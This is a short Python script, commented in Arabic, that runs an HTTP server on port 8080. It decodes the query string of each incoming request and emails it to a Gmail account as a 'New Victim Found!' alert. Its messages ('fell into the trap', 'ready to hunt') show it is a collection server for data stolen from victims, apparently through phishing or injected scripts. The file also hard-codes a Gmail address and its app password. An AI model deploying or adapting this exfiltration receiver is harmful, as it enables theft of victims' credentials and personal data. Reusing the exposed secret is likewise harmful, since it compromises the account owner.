import http.server
import socketserver
from urllib.parse import unquote
import smtplib
from email.mime.text import MIMEText

# --- إعدادات يوسف الشخصية ---
MY_EMAIL = "youssefcom281@gmail.com"
MY_APP_PASSWORD = "kskweaadosfcfozs" # الكود الـ 16 حرف بتاعك
RECEIVER_EMAIL = "youssefcom281@gmail.com"

def send_to_gmail(captured_data):
    msg = MIMEText(f"🎯 هدف جديد وقع في الفخ!\n\nالبيانات:\n{captured_data}")
    msg['Subject'] = 'New Victim Found! 💀'
    msg['From'] = MY_EMAIL
    msg['To'] = RECEIVER_EMAIL

    try:
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(MY_EMAIL, MY_APP_PASSWORD)
            server.sendmail(MY_EMAIL, RECEIVER_EMAIL, msg.as_string())
        print("[+] تم إرسال الإيميل بنجاح! 📧")
    except Exception as e:
        print(f"[-] خطأ: تأكد من تفعيل التحقق بخطوتين. {e}")

class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if '?' in self.path:
            decoded_data = unquote(self.path.split('?')[1])
            print(f"\n[!!!] تم سحب بيانات: {decoded_data}")
            send_to_gmail(decoded_data)
        return http.server.SimpleHTTPRequestHandler.do_GET(self)

PORT = 8080
with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
    print(f"======================================")
    print(f"   SERVER IS LIVE - READY TO HUNT 💀")
    print(f"======================================")
    httpd.serve_forever()